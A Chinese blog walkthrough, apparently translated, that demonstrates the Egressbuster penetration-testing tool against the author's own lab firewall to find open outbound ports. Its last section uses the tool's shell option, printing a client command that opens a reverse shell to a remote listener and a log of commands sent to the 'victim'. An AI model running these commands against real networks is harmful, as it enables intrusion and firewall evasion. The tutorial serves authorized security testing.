****

[](https://youtu.be/ug5ZuezbD3c)

**我已经使用Egressbuster有段时间了。从我的使用体验来讲Egressbuster非常的实用，因此我想在这里把它介绍给大家。**

 **Egressbuster - 简介**

Egressbuster（[GitHub](https://github.com/trustedsec/egressbuster)）是由[TrustedSec](https://www.trustedsec.com/2012/02/new-tool-release-egress-buster-find-outbound-ports/)开发的一个用于在渗透测试期间测试出站端口的工具。

 **配置防火墙**

首先，我将[防火墙](https://www.doyler.net/security-not-included/zotac-zbox-ci323-pfsense)配置为阻止除了22,80,443和31337-31339之外的所有出站端口，以验证应用程序的可用性。

![egressBuster-1-firewallRules.png](https://image.3001.net/images/20180226/1519606964266.png!small)  

此外，仅允许HTTP（s）加密流量的进出站，也更能反映一个真实的网络环境。

 **启动服务器**

防火墙规则配置完成后，我启动了服务器上的[DO droplet](https://www.digitalocean.com/).。

    
    
    root@ubuntu-512mb-sfo2-01:~# ifconfig eth0 | grep Mask
              inet addr:138.xx.xx.xx  Bcast:138.xx.xx.255  Mask:255.255.xx.xx
    
    root@ubuntu-512mb-sfo2-01:~# python egress_listener.py 138.xx.xx.xx eth0 172.xx.xx.xx
    [*] Inserting iptables rule to redirect connections from 172.xx.xx.xx to **all TCP ports** to Egress Buster port 1090/tcp
    [*] Listening on all TCP ports now... Press control-c when finished.

 **运行客户端**

现在，可以开始测试我们的规则了。虽然我使用的是egressbuster.py脚本，但结果与可执行文件是相同的。另外根据我的测试经验，想要测试连接上的所有端口，大概需要12分钟左右的时间。

    
    
    C:\Users\Ray\Documents>time
    The current time is: 15:57:43.78
    Enter the new time:
    C:\Users\Ray\Documents>python egressbuster.py 138.xx.xx.xx 1-65535
    [i] Sending packets to egress listener (138.xx.xx.xx)...
    [i] Starting at: 1/tcp, ending at: 65535/tcp
    [*] Connection made to 138.xx.xx.xx on port: 22/tcp
    [*] Connection made to 138.xx.xx.xx on port: 80/tcp
    [*] Connection made to 138.xx.xx.xx on port: 443/tcp
    [v] Trying: TCP 1000
    [v] Trying: TCP 2000
    
    ... <snip> ...
    
    [v] Trying: TCP 31000
    [*] Connection made to 138.xx.xx.xx on port: 31337/tcp
    [*] Connection made to 138.xx.xx.xx on port: 31338/tcp
    [*] Connection made to 138.xx.xx.xx on port: 31339/tcp
    [v] Trying: TCP 32000
    [v] Trying: TCP 33000
    
    ... <snip> ...
    
    [v] Trying: TCP 65000
    [*] All packets have been sent
    [i] Remaining threads: 301
    [i] Remaining threads: 102
    [i] Remaining threads: 3
    
    ... <snip> ...
    
    [i] Remaining threads: 3
    Traceback (most recent call last):
      File "egressbuster.py", line 168, in 
        time.sleep(2)
    KeyboardInterrupt
    
    C:\Users\Ray\Documents>time
    The current time is: 16:09:49.56
    Enter the new time:

可以看到有三个线程没有工作，我不确定是什么原因导致的，但测试的结果仍然完全准确。

 **服务器结果**

回到服务器，我们可以看到所有连接也都正常。

    
    
    root@r4y-ubuntu-512mb-sfo2-01:~# python egress_listener.py 138.xx.xx.xx eth0 172.xx.xx.xx
    [*] Inserting iptables rule to redirect connections from 172.xx.xx.xx to **all TCP ports** to Egress Buster port 1090/tcp
    [*] Listening on all TCP ports now... Press control-c when finished.
    [*] Connected from 172.xx.xx.xx on port: 22/tcp
    [*] Connected from 172.xx.xx.xx on port: 80/tcp
    [*] Connected from 172.xx.xx.xx on port: 443/tcp
    [*] Connected from 172.xx.xx.xx on port: 31338/tcp
    [*] Connected from 172.xx.xx.xx on port: 31337/tcp
    [*] Connected from 172.xx.xx.xx on port: 31339/tcp
    ^C
    [*] Exiting and removing iptables redirect rule.
    [*] Done

 **Shell参数**

最后，我想快速演示下shell参数。此参数可用于创建一个[反向shell](https://www.trustedsec.com/2012/07/egress-buster-reverse-bypassav/)，并允许你将命令发送到“目标”系统。 **作者注释：**
该反向shell需要从你的监听服务器转到内部服务器，因此你需要配置外部IP地址或NAT。

首先，我在我的pfSense上设置NAT规则，以便我可以接收命令。

![egressBuster-2-natEverything.png](https://image.3001.net/images/20180226/15196069958645.png!small)  

接着，我使用shell参数启动服务器。

    
    
    root@r4y-ubuntu-512mb-sfo2-01:~# python egress_listener.py 138.xx.xx.xx eth0 172.xx.xx.xx shell
    [*] Inserting iptables rule to redirect connections from 172.xx.xx.xx to **all TCP ports** to Egress Buster port 1090/tcp
    [*] Listening on all TCP ports now... Press control-c when finished.

最后，我运行脚本再次测试传出连接。注意，这里我只使用1-50端口进行此测试。

    
    
    C:\Users\Ray\Documents>python egressbuster.py 138.xx.xx.xx 1-50 shell
    [i] Sending packets to egress listener (138.xx.xx.xx)...
    [i] Starting at: 1/tcp, ending at: 50/tcp
    [*] Connection made to 138.xx.xx.xx on port: 22/tcp
    [*] All packets have been sent
    [i] Remaining threads: 50
    [i] Remaining threads: 50
    [i] Remaining threads: 1
    [i] Remaining threads: 1
    [*] Done

在监听端，我能够发送命令给客户端。但从下面结果可以看到，该shell并不稳定而且会导致一些命令无法执行以及报错。但是我们依然可以利用它来，获取一些简单但同等重要的信息。

    
    
    root@r4y-ubuntu-512mb-sfo2-01:~# python egress_listener.py 138.xx.xx.xx eth0 172.xx.xx.xx shell
    [*] Inserting iptables rule to redirect connections from 172.xx.xx.xx to **all TCP ports** to Egress Buster port 1090/tcp
    [*] Listening on all TCP ports now... Press control-c when finished.
    [*] Connected from 172.xx.xx.xx on port: 22/tcp
    Enter the command to send to the victim:
    Enter the command to send to the victim: whoami
    megatron\ray
    Enter the command to send to the victim: ipconfig
    Windows IP Configuration
    
    
    Ethernet adapter Ethernet 2:
    
       Connection-specific DNS Suffix  . : xxx
       IPv4 Address. . . . . . . . . . . : 192.168.5.xx
       Subnet Mask . . . . . . . . . . . : 255.255.255.0
       Default Gateway . . . . . . . . . : 192.168.5.1
    
    Tunnel adapter isatap.
    Enter the command to send to the victim: dir
    ----------------------------------------    Exception happened during processing of request from ('172.xx.xx.xx', 59070)
    Traceback (most recent call last):
      File "/usr/lib/python2.7/SocketServer.py", line 596, in process_request_thread
        self.finish_request(request, client_address)
      File "/usr/lib/python2.7/SocketServer.py", line 331, in finish_request
        self.RequestHandlerClass(request, client_address, self)
      File "/usr/lib/python2.7/SocketServer.py", line 652, in __init__
        self.handle()
      File "egress_listener.py", line 63, in handle
        self.request.sendall(request)
      File "/usr/lib/python2.7/socket.py", line 228, in meth
        return getattr(self._sock,name)(*args)
    error: [Errno 32] Broken pipe
    ----------------------------------------    
    dir
    ^C
    [*] Exiting and removing iptables redirect rule.
    [*] Done

 **Egressbuster - 总结**

这是一个测试网络中出站端口的好工具，我经常使用它来辅助我的测试。

此外，可执行文件的支持对于没有Python的Windows机器提供了极大的便利。

注意，一些供应商标记了可执行文件，因此在测试期间要注意这一点。

![egressBuster-3-virusTotal.png](https://image.3001.net/images/20180226/15196070129880.png!small)  

*参考来源：doyler，FB小编 secist 编译，转载请注明来自FreeBuf.COM

